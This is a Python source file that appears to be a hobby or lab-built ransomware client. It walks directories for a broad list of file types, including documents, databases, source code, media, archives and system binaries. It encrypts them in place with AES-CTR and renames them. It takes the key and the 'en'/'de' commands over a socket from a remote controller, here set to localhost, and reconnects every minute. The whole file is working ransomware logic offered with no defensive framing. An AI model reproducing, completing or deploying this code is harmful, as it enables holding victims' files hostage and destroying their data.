import os 
import os.path
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Util import Counter
import socket 
import time

#encryption method AES_CTR mode
def encryption(key,file_name):
	counter = Counter.new(128)
	c = AES.new(key,AES.MODE_CTR,counter=counter)
	if os.path.exists(file_name):
		with open(file_name,'r+b') as f:
			block_size = 16
			plaintext = f.read(block_size)
			while plaintext:
				f.seek(-len(plaintext),1)
				f.write(c.encrypt(plaintext))
				plaintext = f.read(block_size)
		os.rename(file_name,file_name+".txt")
		return [key]

#decryption method AES_CTR
def decryption(key,file_name):
	counter = Counter.new(128)
	d = AES.new(key,AES.MODE_CTR,counter=counter)
	with open(file_name,'r+b') as f:
		block_size = 16
		plaintext = f.read(block_size)
		while plaintext:
			f.seek(-len(plaintext),1)
			f.write(d.decrypt(plaintext))
			plaintext = f.read(block_size)
		os.rename(file_name,file_name.strip(".txt"))

# listing windows partitions
def partition_windows():
	p_list = []
	for p in range(65,91):
		p = chr(p) + "://"
		if os.path.exists(p):
			p_list.append(p)

# listing linux directories 
def dirs_linux():
	p_list = ["/home","/usr","/sbin","/bin"]
	return p_list

#listing the files
def dir_f_list(d):
	extensions = [
	'exe', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES [danger]
	'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
    'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
    'yml', 'yaml', 'json', 'xml', 'csv', # structured data
    'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images
    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
    'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
    'java', 'class', 'jar', # java source code
    'ps', 'bat', 'vb', # windows based scripts
    'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
    'go', 'py', 'pyc', 'bf', 'coffee', # other source code files
	'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
	'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
	'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
	'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak' 
	]
	fd = []
	for d , sd , f in os.walk(d):
		for file_name in f:
			full_path = os.path.join(d,file_name)
			ex = full_path.split(".")[-1]
			if ex in extensions:
				fd.append(full_path)
				#print(full_path)
	return fd
#client to connection
def client():
	port = 4545
	ip = "127.0.0.1"
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((ip,port))
		while True:
			command = s.recv(2048)
			command = command.decode('ascii')
			if "key" in command:
				padding = lambda data_key:data_key + (16 -len(data_key) % 16) * "*"
				key = padding(command.split(" ")[1]).encode('ascii')
				s.send(b'\n the key is saved\n')
			if command == "en":
				files = dir_f_list("/home/tarou/Desktop/new")
				for f in files:
					encryption(key,f)
				s.send(b'\ndone\n')
			if command == "de":
				files = dir_f_list("/home/tarou/Desktop/new")
				for f in files:
					decryption(key,f)
				s.send(b'done')
	except socket.error as e:
		print("trying to connect with server with in 60 sec")
		time.sleep(60)
		s.close()
		client()

client()
#key = Random.new().read(16)
#print(key)
#files = dir_f_list("/home/tarou/Desktop/new")
#for f in files:
	#encryption(key,f)

#files = dir_f_list("/home/tarou/Desktop/new")
#o = input("fo you want to reverse ?")
#if o == "y":
#	for f in files:
#		decryption(key,f)